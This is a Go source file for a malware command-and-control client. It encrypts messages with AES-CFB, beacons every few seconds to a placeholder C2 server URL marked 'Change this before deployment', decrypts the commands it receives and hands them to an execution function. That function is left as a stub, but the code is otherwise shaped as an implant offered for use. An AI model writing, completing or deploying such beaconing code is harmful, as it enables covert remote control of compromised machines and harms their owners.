package c2communication

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"time"
)

// C2 server details (Change this before deployment)
const c2ServerURL = "http://your-c2-server.com/command"

// AES Encryption for C2 messages
func encryptMessage(message string, key []byte) string {
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("[!] AES encryption failed:", err)
		return ""
	}

	iv := make([]byte, aes.BlockSize)
	_, err = io.ReadFull(rand.Reader, iv)
	if err != nil {
		fmt.Println("[!] IV generation failed:", err)
		return ""
	}

	ciphertext := make([]byte, len(message))
	mode := cipher.NewCFBEncrypter(block, iv)
	mode.XORKeyStream(ciphertext, []byte(message))

	return base64.StdEncoding.EncodeToString(append(iv, ciphertext...))
}

// AES Decryption for received C2 commands
func decryptMessage(encryptedMessage string, key []byte) string {
	data, _ := base64.StdEncoding.DecodeString(encryptedMessage)
	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println("[!] AES decryption failed:", err)
		return ""
	}

	iv := data[:aes.BlockSize]
	ciphertext := data[aes.BlockSize:]

	decrypted := make([]byte, len(ciphertext))
	mode := cipher.NewCFBDecrypter(block, iv)
	mode.XORKeyStream(decrypted, ciphertext)

	return string(decrypted)
}

// C2 Beaconing - Contacts C2 server for commands
func beaconToC2(aesKey []byte) {
	for {
		resp, err := http.Get(c2ServerURL)
		if err != nil {
			fmt.Println("[!] Failed to contact C2 server:", err)
			time.Sleep(30 * time.Second) // Retry every 30 seconds
			continue
		}
		defer resp.Body.Close()

		// Read command from C2
		commandBuf := make([]byte, 1024)
		n, _ := resp.Body.Read(commandBuf)
		encryptedCommand := string(commandBuf[:n])

		// Decrypt command
		command := decryptMessage(encryptedCommand, aesKey)
		fmt.Println("[+] Received command:", command)

		// Execute command (Only safe system commands)
		if command == "exit" {
			fmt.Println("[!] Exiting C2 session...")
			os.Exit(0)
		} else {
			executeCommand(command)
		}

		time.Sleep(10 * time.Second) // Delay before next beacon
	}
}

// Execute received C2 commands
func executeCommand(command string) {
	fmt.Println("[+] Executing command:", command)
	// Implement secure command execution (e.g., run OS commands safely)
}

// Start C2 Communication
func StartC2Communication(aesKey []byte) {
	fmt.Println("[+] Starting C2 Communication...")
	go beaconToC2(aesKey)
}
